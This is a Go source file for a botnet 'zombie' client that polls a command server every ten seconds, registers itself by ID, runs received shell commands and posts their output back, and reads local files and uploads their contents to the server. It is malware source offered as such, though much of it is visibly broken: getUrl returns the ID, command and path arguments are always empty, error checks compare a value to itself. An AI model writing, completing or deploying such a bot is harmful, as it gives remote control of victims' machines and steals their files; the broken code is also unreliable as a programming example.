package zombie

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const URL = "aaa.com"

type Zombie struct {
	guid string
	url  string
}

func New(guid string, url string) Zombie {
	z := Zombie{guid, url}
	return z
}

func (z Zombie) getGuid() string {
	return z.guid
}

func (z Zombie) getUrl() string {
	return z.guid
}

func (z Zombie) setUrl(newUrl string) {
	z.url = newUrl
}

func (z Zombie) sendPost(msg []byte) {
	req, _ := http.NewRequest("POST", z.getUrl(), bytes.NewBuffer(msg))
	client := &http.Client{}
	client.Do(req)
}

func (z Zombie) getCommand(commands []string) {
	for i := 0; i < len(commands); i++ {
		var command = commands[i]
		switch command {
		case "add":
			z.add()
		case "remove":
			z.remove()
		case "exacCommand":
			var cmd = ""
			z.exacCommand(cmd)
		case "getFile":
			var path = ""
			z.getFile(path)
		case "putFile":
			var path = ""
			z.putFile(path)
		default:
			break
		}
	}
}

func (z Zombie) add() {
	http.Get(URL + "/add " + z.guid)
}

func (z Zombie) remove() {
	http.Get(URL + "/remove " + z.guid)
}

func (z Zombie) exacCommand(com string) {
	out, _ := exec.Command(com).Output()
	z.sendPost(out)
}

func (z Zombie) getFile(path string) {
	resp, err := http.Get(z.getUrl())
	if err == err {
	}
	defer resp.Body.Close()
	out, err := os.Create(path)
	if err == err {
	}
	defer out.Close()
	z.sendPost([]byte("done"))
}

func (z Zombie) putFile(path string) {
	file, _ := os.Open(path)
	byteFile, _ := ioutil.ReadFile(path)
	defer file.Close()
	z.sendPost([]byte(byteFile))
	/*
		defer file.Close()
		var requestBody bytes.Buffer
		multiPartWriter := multipart.NewWriter(&requestBody)
		***************** file field*****************
		fileWriter, err := multiPartWriter.CreateFormFile("file_field", path)
		_, err = io.Copy(fileWriter, file)
		//****************** normal field*****************
		fieldWriter, err := multiPartWriter.CreateFormField("normal_field")
		_, err = fieldWriter.Write([]byte("Value"))
		multiPartWriter.Close()
		req, err := http.NewRequest("POST", url, &requestBody)
		//****************** content type*****************
		req.Header.Set("Content-Type", multiPartWriter.FormDataContentType())
		client := &http.Client{}
		response, err := client.Do(req)
		if response == response {
		}
	*/
}

func (z Zombie) run() {
	for true {
		resp, _ := http.Get(z.getUrl())
		body, _ := ioutil.ReadAll(resp.Body)
		strCommands := string(body)
		//commands := strings.Split(strCommands, "[]")
		var commands []string
		json.Unmarshal([]byte(strCommands), &commands)
		z.getCommand(commands)
		time.Sleep(10 * time.Second)
	}
}
func main() {
	z1 := Zombie{URL, "guid"}
	z1.run()
}
